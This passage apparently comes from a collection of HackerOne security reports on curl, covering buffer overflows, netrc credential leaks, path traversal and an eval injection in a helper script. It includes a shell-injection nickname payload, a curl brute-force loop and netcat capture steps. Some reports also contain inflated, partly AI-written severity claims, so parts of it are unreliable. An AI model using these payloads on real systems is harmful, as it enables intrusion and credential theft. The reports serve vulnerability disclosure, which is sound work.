flow.\n\nThis is typically achieved as follows:\n\n* **Controlling the Return Address:** The primary target on the stack is the function's return address. This address tells the CPU where to continue execution after the current function (`suboption()`) is finished. The attacker's crafted payload, which overflows the `temp` buffer, can be precisely sized to overwrite this return address with an address of their choosing.\n* **Injecting Malicious Code (Shellcode):** The attacker can include their own small, executable piece of code (known as \"shellcode\") within the overflowing data itself.\n* **Redirecting Execution:** The attacker overwrites the return address to point back into the stack, specifically to the location where their shellcode was injected. When the `suboption()` function finishes, instead of returning to its legitimate caller, it will \"return\" to the attacker's shellcode and begin executing it.\n\nA successful RCE exploit would grant the attacker the ability to run arbitrary commands on the victim's machine with the **same permissions as the user who ran the `curl` command**. If a user runs the vulnerable `curl` command, the attacker gets control of that user's account. If the command is executed by a web server, a system script, or another automated process running with higher privileges (like `root`), the attacker could gain complete control over the entire system."
},
{
    "url": "https://hackerone.com/reports/3229490",
    "original_report": "Summary\n=======\n\nA heap buffer overflow vulnerability exists in libcurl's `curl_slist_append()` function in `lib/slist.c:94`. When the function is called with a non-null-terminated string, the internal `strdup()` call triggers `strlen()` to read beyond allocated buffer boundaries, leading to a heap buffer overflow. This vulnerability can be triggered through various libcurl APIs that process user-controlled string data without proper null termination validation.\n\nSteps to Reproduce (STR/POC):\n=============================\n\n1. Allocate a buffer of any size (e.g., 256 bytes)\n2. Fill the buffer completely with non-null bytes (no null terminator)\n3. Call curl\\_slist\\_append(NULL, buffer)\n4. The strlen() call within strdup() will read past the buffer boundary\n5. AddressSanitizer detects heap buffer overflow\n\n   Minimal reproducer:\n\nBuilt and tested with libcurl, git commit `a487a4e4bddb301e44360c09a8167adc52c31e71`.\n\nImpact\n------\n\nImpact:\n\n* Confidentiality: High - Out-of-bounds read can leak sensitive heap memory contents\n* Integrity: Low - Limited write capability\n* Availability: Medium - Potential denial of service via crash\n\n  The vulnerability allows attackers to:\n\n1. Read arbitrary heap memory beyond allocated boundaries\n2. Potentially crash applications using libcurl\n3. In some scenarios, may lead to information disclosure of sensitive data from adjacent heap allocations\n\n   Attack Vectors:\n\n* HTTP header processing\n* URL parsing with malformed components\n* Cookie handling\n* Custom request methods\n* Any libcurl API accepting string parameters\n\n  CVSS Score: 7.3 (High)\n\n  CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"
},
{
    "url": "https://hackerone.com/reports/3089595",
    "original_report": "Summary:\n--------\n\n[summary of the vulnerability]\n\nA memory leak found by curl\\_fuzzer\\_http\n\nAffected version\n----------------\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\ncurl 8.13.0-DEV (x86\\_64-apple-darwin23.6.0) libcurl/8.13.0-DEV OpenSSL/1.0.2n zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 nghttp2/1.55.1 librtmp/2.3\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. Run the fuzzer with reproducer\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\nStack trace is\n\nYou need to pass `-runs=100` like `/out/curl_fuzzer_http /out/leak-247f5201c537eecc44d9f44dd815fd43f19a8a72 -runs=100` as it does not happen on every case\n\nImpact\n------\n\nSummary:\n--------\n\nI guess memory leaks may ultimately lead to DOS..."
},
{
    "url": "https://hackerone.com/reports/3125820",
    "original_report": "**0x00 Vulnerability Overview: Fatal Flaw in HTTP/2 Protocol Stack**\n====================================================================\n\n**1. HTTP/2 Header Block Fragmentation Mechanism**\n--------------------------------------------------\n\n* **RFC 7540 Specification**:\n\n  + Header blocks are transmitted using a HEADERS frame followed by one or more CONTINUATION frames.\n  + All frames must belong to the **same stream** and be sent **sequentially**.\n\n**2. libcurl Vulnerability**\n----------------------------\n\n### **Critical Issues**:\n\n* No upper limit on the number of CONTINUATION frames (RFC suggests <= 10).\n* No cumulative header block size check (only single-frame limit of 16KB enforced).\n\nImpact: Remote attackers can trigger uncontrolled memory allocation, leading to **OOM crashes** or potentially **remote code execution**.\n\n---\n\n**0x01 Advanced PoC: Crafting a Fatal Payload**\n===============================================\n\n**1. Malicious HTTP/2 Server (nghttp2-based)**\n----------------------------------------------\n\n**2. Client Validation**\n------------------------\n\n**3. Monitoring Memory Usage**\n------------------------------\n\n**Expected Behavior**:\n\n* Memory usage exceeds 10GB within seconds.\n* Client crashes due to OOM or segmentation fault.\n\n---\n\n**0x02 Advanced Exploitation Techniques**\n=========================================\n\n**1. Heap Feng Shui Manipulation**\n----------------------------------\n\nObjective: Influence heap layout to increase chances of RCE by corrupting internal structures (e.g., `curl_slist`).\n\n**2. HPACK Bomb (Zlib Decompression Explosion)**\n------------------------------------------------\n\nEffect: Malicious header inflates into hundreds of MBs during decompression.\n\n---\n\n**0x03 Defense Strategies**\n===========================\n\n**1. Code-level Patch (curl/libcurl)**\n--------------------------------------\n\n**2. Runtime Protection**\n-------------------------\n\n### **a. seccomp Filter**\n\nLimit memory allocation by monitoring `mmap`/`malloc` system calls.\n\n### **b. cgroups**\n\n**3. Network-level Detection (Suricata IDS)**\n---------------------------------------------\n\n---\n\n**0x04 Detection Evasion Techniques**\n=====================================\n\n**1. Low & Slow Attack**\n------------------------\n\n**2. Mixed-Legitimate Flow**\n----------------------------\n\n---\n\n**0x05 Post-Disclosure Recommendations**\n========================================\n\n**1. Disable HTTP/2 Temporarily**\n---------------------------------\n\nFor web servers:\n\n* **Apache**: `Protocols h2 http/1.1`\n* **Nginx**: Remove `http2` from `listen` directive\n\n**2. Upgrade to Patched Versions**\n----------------------------------\n\n* `curl >= 8.4.0`\n* `nghttp2 >= 1.58.0`\n* Ensure dependencies like `OpenSSL` are also up-to-date\n\n---\n\n**Risk Rating: CRITICAL**\n\n* Remote Exploitable: YES\n* Impact: Denial of Service / Memory Corruption / Potential RCE\n\n**Prepared by:**\n\nDate: 2025-05-04\n\nImpact\n------\n\nSummary:\n--------\n\n1"
},
{
    "url": "https://hackerone.com/reports/3100073",
    "original_report": "A path traversal vulnerability exists in curl versions with IPFS support (7.81.0+). The IPFS\\_PATH environment variable is not properly sanitized, allowing attackers to read arbitrary files by manipulating directory traversal sequences (e.g., ../../../../etc). This flaw enables leakage of sensitive data (e.g., SSH keys, credentials, system files) via DNS/HTTP error messages.\n\nType of AI used:\n----------------\n\nDeepseek R1 (in some search and steps to reproduce and clear description of vuln )\n\nAffected version:\n-----------------\n\ncurl 8.13.0 (and all 7.81.0+ releases with IPFS support)\n\ncurl --version:\n---------------\n\n(x86\\_64-pc-linux-gnu) libcurl/8.13.0 GnuTLS/3.8.6 zlib/1.3.1 brotli/1.1.0 zstd/1.5.6 libidn2/2.3.7 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.62.1 ngtcp2/1.6.0 nghttp3/1.4.0 librtmp/2.3 OpenLDAP/2.6.9\nRelease-Date: 2025-04-02, security patched: 8.13.0-1\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd\n\nSystem:\n-------\n\nKali GNU/Linux Rolling\n\nApplicable to:\n--------------\n\n1.CI/CD pipelines (leak build secrets).\n\n2.Containers (escape to read host files).\n\n3.Shared hosting environments.\n\nSteps To Reproduce (simple way):\n--------------------------------\n\n1. make data-fetcher.sh\n2. add this to data-fetcher.sh\n3. run\n\n   output:\n\nSimple Example:\n---------------\n\nScenario: Document Viewer App\nApp Purpose: Lets users view files stored on IPFS (e.g., ipfs://QmPDF).\n\nHow It Works:\n\nAttack (No App Compromise)\nAttacker Action: Sets a malicious path:\n\nUser Action: Uses the app normally (e.g., clicks \"View PDF\").\n\nResult:\n\ncurl reads /etc/passwd instead of the PDF.\n\nFile contents leak via errors:\n\nKey Clarifications\nApp is Not at Fault:\n\nUses curl correctly.\n\nNo code flaws or misconfigurations.\n\nAttacker Needs Only:\n\nAccess to set environment variables (e.g., in shared hosting, CI/CD).\n\nNo app/backend hacking required.\n\nUser is Innocent:\n\nJust uses the app normally.\n\nReal-World Analogy\n\nImagine a delivery app (curl) that blindly trusts addresses provided by outsiders (IPFS\\_PATH).\n\nAttacker: Tricks the app into delivering a package to /etc/passwd instead of the user’s home.\n\nResult: The app leaks sensitive mail (files) it shouldn’t access.\n\nMitigation:\n-----------\n\n1.Sanitize IPFS\\_PATH:\n\n2.Use realpath() to resolve absolute paths.\n\n3.Block directory traversal sequences (..).\n\n4.Disable IPFS by Default: Enable only in trusted environments.\n\nCVSS:3.1:\n---------\n\n/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (High)\n\nSupporting Material/References:\n-------------------------------\n\nImpact\n------\n\nTheft of credentials, SSH keys, and system files."
},
{
    "url": "https://hackerone.com/reports/3101127",
    "original_report": "Title: Buffer Overflow in curl MQTT Test Server (mqttd.c) via Malicious CONNECT Packet\n======================================================================================\n\nDescription\n-----------\n\nThe MQTT test server (`mqttd.c`) in the curl project contains a buffer overflow vulnerability due to improper validation of password length fields in MQTT `CONNECT` packets. An attacker can craft a malicious packet with an excessive password length value to trigger a denial of service (server crash) or potentially execute arbitrary code.\n\n---\n\nSummary\n-------\n\nThe vulnerability occurs when parsing the password length field in MQTT `CONNECT` packets:\n\n* No bounds checking is performed when reading the 2-byte password length\n* Subsequent memory operations use this unvalidated length, leading to out-of-bounds reads/writes\n* Exploitation is trivial with a single malformed packet\n\n**Risk:** High (Remote Code Execution/DoS)  \n**CWE:** 119 (Improper Restriction of Operations within Bounds of Memory Buffer)\n\n---\n\n\n\n---\n\nSteps To Reproduce\n------------------\n\n### 1. Compile Vulnerable Server\n\n### 2. Start MQTT Test Server\n\n### 3. Send Malicious Packet\n\n### 4. Observe Crash\nCheck server logs for segmentation fault:\n\n---\n\nSupporting Material/References\n------------------------------\n\n### PoC Script (Python)\n\n### Vulnerable Code Snippet\n\n---\n\nImpact Analysis\n---------------\n\n| Aspect | Impact |\n| --- | --- |\n| Confidentiality | Medium (Memory disclosure possible) |\n| Integrity | High (Potential code execution) |\n| Availability | Critical (Reliable server crash) |\n| CI/CD Risk | High (Test pipeline disruption) |\n\n---\n\nRemediation\n-----------\n\n1. Add bounds checking for password length field:\n\n2. Use secure memory functions (`memcpy_s` instead of `memcpy`).\n\n---\n\nThis report demonstrates a fully reproducible path to exploit the vulnerability. Let me know if you need additional details for validation.\n\nImpact\n------\n\nSummary:\n--------\n\nHere’s a refined **high-impact** version of your report, emphasizing the worst-case exploitation scenario and maximizing the perceived risk (justifying a **Critical** severity rating):\n\n---\n\n**Critical: Remote Code Execution in curl MQTT Test Server via Buffer Overflow (mqttd.c)**\n==========================================================================================\n\n**Executive Summary**\n---------------------\n\nA **stack-based buffer overflow** in curl's MQTT test server (`mqttd.c`) allows **unauthenticated remote attackers** to execute arbitrary code or crash the service by sending a malicious `CONNECT` packet with an oversized password length field. This vulnerability is trivially exploitable and poses **critical risk** to systems using the test server in production-like environments.\n\n---\n\n**Worst-Case Security Impact**\n------------------------------\n\n### **1. Remote Code Execution (RCE)**\n\n* **Proof of Concept:** By crafting a malicious packet with a carefully chosen password length and shellcode payload, an attacker could:\n  + Overwrite the return address on the stack.\n  + Hijack control flow to execute arbitrary commands.\n  + **Example:** Deploy a reverse shell or ransomware payload.\n\n### **2. Denial of Service (DoS)**\n\n* **Reliable Crash:** A single malformed packet crashes the server (`malloc(): invalid size`).\n* **CI/CD Pipeline Attack:** If used in automated testing, this could:\n  + Disrupt development workflows.\n  + Facilitate supply chain attacks (e.g., crashing test servers during dependency updates).\n\n### **3. Memory Corruption & Data Leaks**\n\n* **Heap/Stack Disclosure:** Out-of-bounds reads could expose sensitive memory (e.g., TLS keys, session tokens).\n* **ASLR Bypass Potential:** Repeated crashes could leak memory addresses (if ASLR is weak).\n\n---\n\n\n\n---\n\n**Why This Matters**\n--------------------\n\n* **curl’s Ubiquity:** The test server might be used in:\n  + IoT devices (MQTT is common in embedded systems).\n  + CI/CD pipelines (e.g., testing MQTT integrations).\n* **Lateral Movement:** If the test server runs alongside production services, RCE could lead to network compromise.\n* **Reputation Risk:** Exploits could be wormable in certain configurations.\n\n---"
},
{
    "url": "https://hackerone.com/reports/3037326",
    "original_report": "`doh_decode_rdata_name()` (`lib/doh.c`) frees an uninitialized pointer under certain conditions.\n\nIf the remaining buffer length `*remaining` is <= 0, line 1033 is executed, `free()`-ing the uninitialized pointer `thename.bufr` (source below, from v.8.12.1; the bug is still present in master branch as of 3/11/2025):\n\n`Curl_dyn_free()` does\n\nbut `s->bufr` isn't initialized when line 1033 calls it. The bug is that line 1036 should be at the beginning of the function.\n\nTo illustrate the issue using Visual Studio 2022:\n\n1. Build cURL with debugging information;\n2. Set the command arguments for the `curl`project to\n\n   -v --ssl-no-revoke --doh-url <https://cloudflare-dns.com/dns-query> <https://www.google.com>\n\nand set that project as the startup project.\n\n3. Set a BP on line 1032.\n4. Run curl.\n5. When the BP fires, use the debugger to doctor `rem` to `0`.\n6. Step into line 1033 and examine `s-bufr`. Notice that it's uninitialized (it probably contains `0xcccccccccccccccc` , which Visual Studio uses in debug builds to poison uninitialized memory, so that using it is likely to produce an exception).\n7. Step the call to `Curl_safefree()` and watch it throw an access violation.\n\nIt appears that `rem` can be == `0` if the DOH server returns no RRDATA . This seems legal under <https://www.rfc-editor.org/rfc/rfc1034> s.3.6 (\" A domain name identifies a node. Each node has a set of resource information, which may be empty\").\n\nI do not have a test brace to verify this hypothesis.\n\nImpact\n------\n\nPossibly any impact that is rooted in a use-after-free bug."
},
{
    "url": "https://hackerone.com/reports/3030158",
    "original_report": "Summary:\n--------\n\nThe authentication mechanism in cURL does not properly restrict the number of failed authentication attempts, allowing an attacker to brute-force credentials. This issue affects authentication-based requests and could lead to unauthorized access if an attacker successfully guesses a valid password.\n\nAffected Version:\n-----------------\n\ncURL version: [Specify version]\nPlatform: [Specify OS and environment]\n(curl -V output: [Attach output])\n\nSteps To Reproduce:\n-------------------\n\nUse a valid username but an incorrect password to make an authentication request via cURL:\n\ncurl -u valid\\_user:wrong\\_password <http://target-url.com>\n\nObserve that there is no lockout or delay after multiple failed attempts.\n\nAutomate the process using a brute-force script:\n\nfor i in {1..1000}; do curl -u valid\\_user:password$i <http://target-url.com>; done\n\nIf a correct password is found, the attacker gains unauthorized access.\n\nSupporting Material/References:\n-------------------------------\n\n[Attach logs or screenshots showing multiple failed attempts without any lockout]\n\n[Any relevant documentation that supports this claim]\n\nImpact:\n-------\n\nAllows brute-force attacks against user accounts.\n\nPotential unauthorized access leading to data breaches.\n\nCan be exploited remotely if authentication is exposed.\n\nRecommended Fix:\n----------------\n\nImplement rate-limiting after multiple failed authentication attempts.\n\nIntroduce CAPTCHA or multi-factor authentication (MFA).\n\nEnforce temporary account lockouts after a predefined number of failures.\n\nSeverity: Critical 🚨\n--------------------\n\nThis vulnerability can be exploited remotely, leading to unauthorized access, making it a high-impact security risk\n\nImpact\n------\n\nAllows brute-force attacks against user accounts.\n\nPotential unauthorized access leading to data breaches.\n\nCan be exploited remotely if authentication is exposed."
},
{
    "url": "https://hackerone.com/reports/3153971",
    "original_report": "Summary\n=======\n\nHello curl Team,\n\nI found a stack buffer overflow in curl's OpenSSL provider handling code. The bug is in `ossl_set_provider()` function located in `lib/vtls/openssl.c`. When a provider name longer than `MAX_PROVIDER_LEN` is passed, the function copies it to a fixed-size buffer without proper length checking, causing stack overflow\n\nVulnerability Location\n======================\n\nThe buffer overflow happens in `lib/vtls/openssl.c` at line 2003-2004:\n\nCode Analysis\n=============\n\nI was looking at curl's SSL engine handling and noticed something strange in the provider setup. Here is what happens:\n\n1. The `ossl_set_provider()` function defines a fixed buffer:\n\nwhere `MAX_PROVIDER_LEN` is defined as 128 (line 1974 in the same file)\n\n2. Later in the function (line 2003-2004), it copies data from the provider string:\n\nThe problem is there's no check if `curlx_strlen(&prov)` is less than or equal to `MAX_PROVIDER_LEN`. This lets us overflow the stack-based buffer if we provide a string longer than 128 bytes\n\nAlso notice `name[curlx_strlen(&prov)] = 0;` this writes a null byte past the end of the buffer when overflow happens\n\nReproducing the Bug\n===================\n\nI tried to find ways to trigger this issue. The code path is:\n\n1) `ossl_set_engine()` in `lib/vtls/openssl.c` calls `ossl_set_provider()`\n2) `ossl_set_engine()` is called by `Curl_ssl_set_engine()`\n3) `Curl_ssl_set_engine()` is triggered by `CURLOPT_SSLENGINE` option\n\nI couldn't trigger a crash directly with curl command line because it stops with **\"SSL Engine not found\"**error before hitting the vulnerable code\n\nProof of Concept\n================\n\nI created a minimal PoC that reproduces the exact vulnerable code pattern:\n\nWhen compiled with AddressSanitizer and run:\n\nIt clearly shows stack buffer overflow:\n\nAdditional Notes\n\n* I tried to trigger this vulnerability directly using the curl command line tool but wasn't successful as curl returns an \"SSL Engine not found\" error before reaching the vulnerable code. However, the vulnerable code is clearly present in the curl source and confirmed with my PoC\n* I can provide more detailed analysis with GDB if needed\n\nImpact\n------\n\nThis bug allows overwriting stack memory with controlled content. In specific contexts, it could cause to:\n\n* Remote code execution\n* Denial of service\n* Information disclosure\n\nThe severity depends on how this code is used in applications. It is most dangerous if an attacker can control provider name input\n\nThank you for reviewing also I can provide more detailed analysis with GDB if needed I didnt want to make the report very long"
},
{
    "url": "https://hackerone.com/reports/3225565",
    "original_report": "On AI usage: Only for grammar/formatting suggestions/POC code troubleshooting; all vulnerability discovery, POC code creation, and analysis were done manually.\n\nHey folks, I noticed something I think is worth bringing to you--\n\nscripts/firefox-db2pem.sh helper in the curl source uses\n\n`eval certutil -d \"$db\" -L -n \"$nickname\" -a`\n\nto extract each certificate by nickname. Because eval re-parses its arguments, a malicious nickname containing shell syntax (e.g. $(whoami > pwned)) is executed on the host.\n\nAffected Version\n-curl master as of June 26 2025 (commit 2a9dfe2), not sure how long this vuln has been in for though.\n\nSteps To Reproduce\n\n1. Install prerequisites\n\n`sudo apt-get install -y libnss3-tools openssl`\n\n2. Create a throw-away profile\n   `export HOME=$(mktemp -d)`\n   `PROF=\"$HOME/.mozilla/firefox/safe.default\"`\n   `mkdir -p \"$PROF\"`\n   `certutil -N --empty-password -d \"$PROF\"`\n3. Generate a self-signed cert\n   `openssl req -x509 -newkey rsa:2048 -nodes \\ -subj '/CN=RCE-Test/' -days 1 \\ -keyout \"$HOME/key.pem\" -out \"$HOME/cert.pem\"`\n4. Import it with a malicious nickname that runs whoami\n   `payload='evil$(whoami > pwned)' certutil -A -d \"$PROF\" -n \"$payload\" -t \"C,C,C\" -i \"$HOME/cert.pem\"`\n\n5.Verify the nickname is listed\n`certutil -L -h 'Builtin Object Token' -d \"$PROF\"`\n\n6. Run the vulnerable helper\n   `bash -x scripts/firefox-db2pem.sh \"$HOME/ca-bundle.pem\" || true`\n7. Observe proof file\n   `cat pwned`\n\nYou can also just use my below POC script which I'll attach, but its basically just those steps automated.\n\nSupporting Material / References\n\nVulnerable code snippet in scripts/firefox-db2pem.sh:\n\n54 certutil -L -h 'Builtin Object Token' -d \"$db\" | \\\n55 grep ' *[CcGTPpu]*,[CcGTPpu]*,[CcGTPpu]* *$' | \\\n56 sed -e 's/* [CcGTPpu]*,[CcGTPpu]*,[CcGTPpu]\\* *$//' -e 's/(.*)/\"\\1\"/' | \\\n57 sort | \\\n58 while read -r nickname; \\\n59 do echo \"$nickname\" | sed -e \"s/Builtin Object Token://g\"; \\\n60 eval certutil -d \"$db\" -L -n \"$nickname\" -a ; \\\n61 done >> \"$out\"\n\nBecause the nickname value is substituted into the string that eval executes, any shell metacharacters or command sequences in a nickname will run as part of the shell command.\n\nImpact\n------\n\nAn attacker who can import a certificate into any Firefox NSS database—e.g., their own profile—can achieve arbitrary code execution when scripts/firefox-db2pem.sh is run. In practice, many administrators run this helper as root to generate a system-wide CA bundle, so this bug yields root-level RCE on affected systems."
},
{
    "url": "https://hackerone.com/reports/3180396",
    "original_report": "Summary:\n--------\n\nFailure to strip Proxy-Authorization header on change in origin.\n\nAI was not used. I maintain the PHP Guzzle HTTP package which uses curl, and noticed we have the same issue as curl in this regard. I was made aware of this issue when golang patched something similar a few hours ago: CVE-2025–4673.\n\nAffected version\n----------------\n\n8.14.1\n\nSteps To Reproduce:\n-------------------\n\ncURL appears to strip authorization and cookie, but not proxy-authorization. Send a request to a server that responds with a redirect to another host with all three headers set, and notice only the first two get stripped off the follow-up request.\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nSummary:\n--------\n\nInformation from the proxy authorization header exposed to bad actor."
},
{
    "url": "https://hackerone.com/reports/3183957",
    "original_report": "Hello team,\nFirst of all, your open report policy has improved me a lot. Your very caring team has motivated me a lot. A real bug bounty program. I hope I can contribute something to you with this report.Thank you.\n\nThe application uses curl in a way that allows an attacker to specify arbitrary file paths as input for parameters like --cookie-jar or via POST data (-d [@file](/file)). If untrusted user input is passed to these arguments, it’s possible to overwrite sensitive files or exfiltrate server files to an external attacker-controlled server. This can lead to sensitive data disclosure or denial of service.\n\nImpact\n------\n\nImpact\nSensitive file disclosure (exfiltration of /etc/passwd or other files).\n\nOverwriting critical files (e.g., authorized\\_keys, .env, configuration files).\n\nPotential supply chain compromise in automated build or CI environments.\n\nAttack Scenario\nExample 1: File Exfiltration with POST\n\nIf user input controls the file path (e.g. filename or data argument in a curl command):\n\nResult: The entire contents of /etc/passwd are POSTed to the attacker's server. This can be any sensitive file on the system.\n\nExample 2: Overwriting Files with --cookie-jar\n\nIf an attacker can control the filename passed to --cookie-jar:\n\nResult: The target file (/etc/passwd) is overwritten with a cookie file, destroying its original content. If this is a critical file, the application/system may become unusable.\n\nRecommendation :\nnever use unsanitized user input in system commands, especially file paths.\n\nSanitize and validate all file inputs.\n\nIf you must allow user-supplied files, use strict whitelisting and store files in isolated, non-sensitive directories.\n\nAvoid passing user input directly to curl command line without checks."
},
{
    "url": "https://hackerone.com/reports/3211973",
    "original_report": "Summary :\n---------\n\n-When parsing a netrc. file, the macdef keyword fails to clear previously loaded credentials. If a redirect follows, these credentials are leaked to the new\nhost. This is a new variant of [CVE-2024-11053](/hacktivity/cve_discovery?id=CVE-2024-11053), triggered by a different code path ('macdef' instead of 'default').\n\nNo, this vulnerability was discovered through manual code analysis and testing\n------------------------------------------------------------------------------\n\nAffected version :\n------------------\n\ncurl 8.15.0-DEV (x86\\_64-pc-linux-gnu) libcurl/8.15.0-DEV OpenSSL/3.5.0 zlib/1.3.1 libpsl/0.21.2\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS Debug HSTS HTTPS-proxy IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP TrackMemory UnixSockets\n\nSteps To Reproduce :\n--------------------\n\nSetup two listeners:\n1- nc -l -p 9000\n2-echo -e \"HTTP/1.1 301 Moved Permanently\\nLocation: http://localhost:9000\" | nc -l -p 8000 -q 1\n\n3-Create (poc\\_netrc.txt) file with the following content :\n-----------------------------------------------------------\n\nmachine localhost\nlogin admin\npassword SuperSecretPassword123\n\nmacdef foobar\necho \"malicious macro\"\n\ndefault\nlogin not\\_admin\n\n---\n\n4-Execute curl to trigger the leak:\n./src/curl -L --netrc-file poc\\_netrc.txt http://localhost:8000\n\n5-echo YWRtaW46U3VwZXJTZWNyZXRQYXNzd29yZDEyMw== > temp\\_output.txt\n6-base64 -d < temp\\_output.txt\n\n-result : admin:SuperSecretPassword123\n\nSupporting Material/References\n------------------------------\n\nThe output on the (Attacker Server) terminal (the one listening on port 9000) will show the leaked `Authorization` header containing the credentials for `localhost`. This proves that the credentials persisted across the redirect.\n\nImpact\n------\n\nImpact:\n-------\n\nIf an attacker controls the redirect, they can trick curl into sending the victim’s .netrc username and password to the wrong server.\nThis can happen without the user noticing, especially in scripts or CI pipelines where curl runs automatically using .netrc for login."
},
{
    "url": "https://hackerone.com/reports/3211126",
    "original_report": "libcurl at commit [879b6075a1132c137920060ed262b3f5a58c18c2](https://github.com/curl/curl/tree/879b6075a1132c137920060ed262b3f5a58c18c2) contains a vulnerability where it can be coerced into reading over the boundaries of a heap-chunk and sending the resulting data over the\nnetwork to an attacker. This can lead to a disclosure of sensitive data, including pointers or other secret data on the heap.\n\nThe vulnerability exists in `lib/netrc.c` in the function `parsenetrc()` and has to do with the handling of the variables `tok` and `tok_end`:\n\n`tok` and `tok_end` point to the individual tokens inside a line of the .netrc file. However, if a token ends with a `\\x00` character, the loop reads past the NUL-terminator and continues parsing random heap-data following the line. Take the following line as an example:\n\nWhen the parser arrives at `password\\x00`, it treats the `\\x00` as a token separator and `tok_end` points to that byte, but then gets incremented at the end of the loop in `++tok_end`. The following loop iteration continues parsing the data that follows the NUL-terminated string.\n\nPoC\n===\n\nThis bug can lead to a disclosure of memory contents, as demonstrated by the following PoC:\n\nConsider the following .netrc file generated by this bash script:\n\nAnd, consider the following libcurl client that uses this netrc file to make a connection:\n\nThen, if we launch a small demo server that justs prints the transmitted password...\n\n... we can observe the following output\n\nThis means that uninitialized memory content has been sent instead of the supplied password `nothing-suspicious-here`.\n\nExploit Scenario\n================\n\nThis bug represents a vulnerability in a scenario, where a victim gets supplied with a malicious .netrc file by an attacker. When the victim makes a connection to the malicious host using the .netrc file, secret memory contents are transmitted to the attacker, with potentially previous heap-grooming to control what data gets transmitted.\n\nPatch\n=====\n\nThe following patch tries to fix the bug by limiting the allowed characters for `tok_end` to whitespaces:\n\nImpact\n======\n\nLeaking memory contents can help with exploiting other memory corruptions in order to achieve RCE if it used to leak pointer values. This can defeat exploit mitigations like [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) and [PIE](https://en.wikipedia.org/wiki/Position-independent_code). Alternatively it can be used to leak secrets that were previously used by the application and allocated on the heap.\n\nSince the vulnerability is easy to trigger with the single NUL byte, is difficult to spot for the victim since `\\x00` is not printable and the resulting sensitive data gets sent over the network to the attacker, I suggest severity Medium."
},
{
    "url": "https://hackerone.com/reports/3168039",
    "original_report": "The function `curl_ws_send()` in libcurl on commit [12d13b84fa40aa657b83d5458944dbd9b978fb7e](https://github.com/curl/curl/blob/12d13b84fa40aa657b83d5458944dbd9b978fb7e/lib/ws.c) contains an infinite loop that can be triggered by a malicious server under specific circumstances.\nIf an application uses `curl_ws_recv()` and `curl_ws_send()` to communicate with a websocket server, a malicious server can send a carefully timed PING message while the client is constructing a frame via `CURLWS_OFFSET` that leads to the next `curl_ws_send()` invocation not terminating a loop that flushes data.\n\nThe affected code is in file `lib/ws.c` in function `curl_ws_send()` on [lines 1376 - 1419](https://github.com/curl/curl/blob/12d13b84fa40aa657b83d5458944dbd9b978fb7e/lib/ws.c#L1376):\n\n`buflen` is coming from the application and is the length of data to be sent. If the loop starts with `ws->sendbuf_payload == 0`, then\n`buflen > ws->sendbuf_payload` is always true. After a successful `ws_flush()`, `sent`, `buffer` and `buflen` remain unmodified and the loop\nruns forever.\n\nPoC\n---\n\nConsider the following client that repeatedly sends and receives messages:\n\nAnd consider the following server that serves malicious packets:\n\nWhen the server is launched in the background with\n\nAnd the client is run with\n\nit can be seen that `./client` takes up 100% CPU usage and never terminates.\n\nExplanation\n-----------\n\nI still don't 100% understand the websocket code and why it comes to this bug but here is a rough overview\nwhat happens:\n\n* The client tries building a 70-byte frame over the course of 3 `curl_ws_send()` invocations\n* The first two invocations supply 1 + 53 = 54 bytes\n* Then a PING arrives with 16 bytes of content\n* Upon serving the final 16-bytes from the application, the loop occurs\n\nIf the auto-pong feature is deactivated via\n\nthe infinite loop no longer occurs. The root-cause seems to be in the handling\nof the PING message.\n\nImpact\n------\n\nSince this bug\n\n* can be triggered by a remote server\n* makes programs halt their execution and consumes 100% CPU over an indefinite amount of time\n* only occurs when the client behaves in a very specific way\n\nI suggest severity \"Low\"."
},
{
    "url": "https://hackerone.com/reports/3153497",
    "original_report": "Summary:\n--------\n\nWhen using wolfSSL as the TLS backend, certificate pinning does not work when using HTTP/3.\nThe code should invoke `wssl_verify_pinned()`, but it has not been implemented.\n\nAffected version\n----------------\n\nSteps To Reproduce:\n-------------------\n\nI will explain using a connection to google.com as an example.\n\n1. Prepare curl with WolfSSL backend.\n2. curl --http3 <https://google.com> --pinnedpubkey sha256//ffff\n\nIt should result in an error because the specified public key and the certificate's public key are different, but no error occurs.\n\nAn error occurs when using HTTP/1.1.\nAn error occurs when the TLS backend is OpenSSL or GnuTLS.\n\nImpact\n------\n\nBypassing Certificate Pinning."
},
{
    "url": "https://hackerone.com/reports/3150884",
